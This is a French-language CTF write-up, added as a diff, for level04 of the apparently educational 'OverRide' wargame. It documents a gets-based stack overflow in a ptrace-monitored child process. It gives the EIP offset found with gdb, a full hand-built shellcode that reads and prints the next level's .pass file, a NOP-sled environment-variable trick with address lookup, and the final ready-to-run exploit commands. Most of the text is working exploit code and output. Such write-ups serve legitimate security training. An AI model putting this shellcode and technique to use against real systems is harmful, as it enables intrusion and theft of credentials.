@@ -1,0 +1,111 @@
+- Apres analyse du code asm, on remarque que le programme fork.
+- Le pere lance un ptrace sur le fils qui lors qu'un appel systeme
+du fils si celui-ci est 0xb cad execve le pere tue son fils
+- Le fils lance un prctl qui fait que si le pere meurt, le fils
+recoit un signal SIGHUP qui le fait exit
+- Le fils contient un gets qui va servir a faire un overflow pour modifier
+eip
+
+1) On recherche avec gdb la longueur du payload qui va modifier eip
+
+nano test4
+
+python -c 'print "A" * 156 + "BBBB" + "C" * 20'
+
+chmod 777 test4
+
+gdb ./level04
+
+set follow-fork-mode child
+r < <(/tmp/test4)
+
+Starting program: /home/users/level04/level04 < <(/tmp/test4)
+[New process 3605]
+Give me some shellcode, k
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 3605]
+0x42424242 in ?? ()
+(gdb) child is exiting...
+i r
+eax            0x0	0
+ecx            0xf7fd08c4	-134412092
+edx            0xffffd580	-10880
+ebx            0x41414141	1094795585
+esp            0xffffd620	0xffffd620
+ebp            0x41414141	0x41414141
+esi            0x0	0
+edi            0x41414141	1094795585
+eip            0x42424242	0x42424242
+eflags         0x10286	[ PF SF IF RF ]
+
+===> eip est bien a 0x42424242
+
+2) On cree un shellcode qui va ourir le fichier .pass de level05 et
+ensuite l'afficher.
+
+Il sera l'equivalent du code suivant :
+
+int	main(void)
+{
+	int	fd;
+	char	buff[64];
+			
+	bzero(buff, 64);
+	fd = open("/home/users/level05/.pass", O_RDONLY);
+	read(fd, buff, 63);
+	write(1, buff, 63);
+	exit(0);
+}
+
+Le fichier a compiler avec nasm est present dans le dossier Ressources
+
+3) On compile avec et nasm et on extrait le code avec objdump et un script shell
+Les 2 1ere ligne sur le mac le reste sur la vm
+
+nasm -f elf32 shellcode.s
+scp -P 4242 shellcode.o level04@192.168.116.128:/tmp
+objdump -d /tmp/shellcode.o |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+
+4) On exporte le shellcode dans une varible d'env avec des nop devant
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x31\xc0\x50\x6a\x01\xb8\x40\x85\x04\x08\xff\xd0\xfc\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe7\x83\xef\x40\xb1\x40\xf3\xaa\x50\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\xb0\x05\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x89\xc3\x89\xe1\x83\xe9\x40\x89\xcf\xb2\x3f\xb0\x03\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\x89\xf9\xb2\x3f\xb3\x01\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+
+5) On cherche l'adresse de la variable d'env en creant un executable et en simulant les meme conditions
+d'env
+
+nano /tmp/gettoto.c
+
+int     main(void)
+{
+	        printf("TOTO : %p\n", getenv("TOTO"));
+}
+
+cd /tmp
+gcc -m32 gettoto.c
+cd
+mv /tmp/a.out /tmp/level9aaaaaaaaaaaaaaaa
+
+level04@OverRide:~$ /tmp/level9aaaaaaaaaaaaaaaa
+TOTO : 0xffffde17
+
+6) On remplace dans test4 "BBBB" par l'adresse de la variable d'env
+
+nano /tmp/test4
+
+python -c 'print "A" * 156 + "\x17\xde\xff\xff" + "C" * 20'
+
+7) On execute le programme
+
+/home/users/level04/level04 < <(/tmp/test4)
+
+- Exploit : 
+
+nano /tmp/test4
+
+python -c 'print "A" * 156 + "\x17\xde\xff\xff" + "C" * 20'
+
+chmod 777 /tmp/test4
+export TOTO=`python -c 'print "\x90" * 100 + "\x31\xc0\x50\x6a\x01\xb8\x40\x85\x04\x08\xff\xd0\xfc\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe7\x83\xef\x40\xb1\x40\xf3\xaa\x50\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\xb0\x05\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x89\xc3\x89\xe1\x83\xe9\x40\x89\xcf\xb2\x3f\xb0\x03\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\x89\xf9\xb2\x3f\xb3\x01\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+
+/home/users/level04/level04 < <(/tmp/test4)
